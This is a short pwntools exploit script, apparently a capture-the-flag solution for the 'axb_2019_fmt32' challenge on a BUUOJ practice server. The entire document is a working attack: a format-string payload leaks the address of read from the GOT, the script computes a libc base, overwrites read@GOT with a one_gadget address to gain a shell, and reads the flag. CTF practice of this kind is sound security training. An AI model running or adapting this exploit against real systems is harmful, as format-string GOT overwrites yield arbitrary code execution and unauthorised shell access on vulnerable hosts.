from pwn import *

io=remote('node4.buuoj.cn',25649)
#io=process('axb_2019_fmt32')
elf = ELF('./axb_2019_fmt32')
context.log_level = 'debug'

io.recvuntil("Please tell me:")
read_got = elf.got['read']
payload = 'a'+p32(read_got)+'%8$s'
io.sendline(payload)
io.recv(14)
read_addr = u32(io.recv(4))
print(hex(read_addr))

libc_base = read_addr - 0x0d4350
one_gadget = libc_base + 0x3a812
payload = 'a' + fmtstr_payload(8, {read_got: one_gadget},write_size = "byte",numbwritten = 0xa)
print(fmtstr_payload(8, {read_got: one_gadget},write_size = "byte",numbwritten = 10))
io.sendafter('me:', payload)
io.sendline(b'cat flag')
io.interactive()
